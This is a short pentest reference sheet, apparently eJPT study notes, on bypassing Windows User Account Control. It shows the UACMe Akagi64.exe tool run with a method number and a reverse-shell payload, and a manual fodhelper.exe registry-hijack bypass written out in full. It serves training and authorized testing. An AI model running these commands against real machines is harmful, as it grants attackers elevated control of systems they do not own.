# Bypassing UAC With UACMe

User Account Control (UAC) prompts administrators to authorize elevated actions. If an attacker compromises an administrator account but is running in a medium-integrity context, they must bypass UAC to obtain a high-integrity `SYSTEM` or elevated `Administrator` shell.

Used on: **eJPT / Course Reference**

## 1. Enumeration

Check your current user's groups and integrity level:
<!-- cmd: windows -->
```cmd
whoami /groups
```
If you see `Mandatory Label\Medium Mandatory Level` and the user belongs to the `Administrators` group, a UAC bypass is required.

## 2. What is UACMe?

[UACMe](https://github.com/hfiref0x/UACME) is an open-source project cataloging and weaponizing dozens of UAC bypass techniques. It abuses auto-elevating binaries (e.g., `sysprep.exe`, `cliconfg.exe`, `fodhelper.exe`) by hijacking DLLs or modifying registry keys.

## 3. Exploitation with UACMe

Download and compile `Akagi64.exe` (the main UACMe binary). 

1. Identify a method number from the UACMe README that matches the target OS build version. For example, Method `23` abuses `pkgmgr.exe`, and Method `33` abuses `fodhelper.exe`.
2. Generate a payload to execute upon elevation (e.g., a reverse shell `shell.exe`).
3. Execute `Akagi64.exe` with the method number and the payload path:

<!-- cmd: windows -->
```cmd
# Upload Akagi64.exe and shell.exe to C:\Temp
cd C:\Temp
Akagi64.exe 33 C:\Temp\shell.exe
```

When successful, `shell.exe` executes in a high-integrity context, bypassing the UAC prompt entirely.

## 4. Manual fodhelper.exe Bypass (Without UACMe)

`fodhelper.exe` auto-elevates and queries specific registry keys for a command to execute.

<!-- cmd: windows -->
```cmd
# Set the registry key to point to a reverse shell or command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\shell.exe" /f

# Execute fodhelper to trigger the bypass
fodhelper.exe

# Cleanup
REG DELETE HKCU\Software\Classes\ms-settings /f
```
